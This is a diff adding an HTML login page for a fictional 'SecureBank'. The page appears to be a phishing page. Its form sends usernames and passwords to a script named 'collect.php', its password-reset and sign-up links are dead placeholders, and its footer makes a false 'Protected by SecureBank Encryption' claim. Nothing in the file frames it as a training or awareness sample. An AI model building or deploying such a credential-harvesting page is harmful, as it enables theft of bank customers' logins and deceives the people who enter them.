@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SecureBank - Login</title>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+    <link rel="stylesheet" href="assets/css/styles.css">
+    <link rel="icon" href="assets/images/favicon.ico" type="image/x-icon">
+</head>
+<body>
+    <div class="container">
+        <div class="row justify-content-center">
+            <div class="col-md-4">
+                <div class="card mt-5">
+                    <div class="card-header text-center">
+                        <img src="assets/images/bank-logo.png" alt="SecureBank Logo" width="150">
+                        <h3>SecureBank Login</h3>
+                    </div>
+                    <div class="card-body">
+                        <form id="loginForm" onsubmit="return validateForm()" action="collect.php" method="POST">
+                            <div class="form-group">
+                                <label for="username">Username or Email</label>
+                                <input type="text" class="form-control" id="username" name="username" placeholder="Enter username or email">
+                            </div>
+                            <div class="form-group">
+                                <label for="password">Password</label>
+                                <input type="password" class="form-control" id="password" name="password" placeholder="Enter password">
+                            </div>
+                            <button type="submit" class="btn btn-primary btn-block">Sign In</button>
+                        </form>
+                        <div class="text-center mt-3">
+                            <a href="#">Forgot Password?</a> | <a href="#">Create Account</a>
+                        </div>
+                    </div>
+                    <div class="card-footer text-center">
+                        <img src="assets/images/security-badge.png" alt="Secure" width="50">
+                        <p>Protected by SecureBank Encryption</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+    <script src="assets/js/scripts.js"></script>
+</body>
+                          </html>
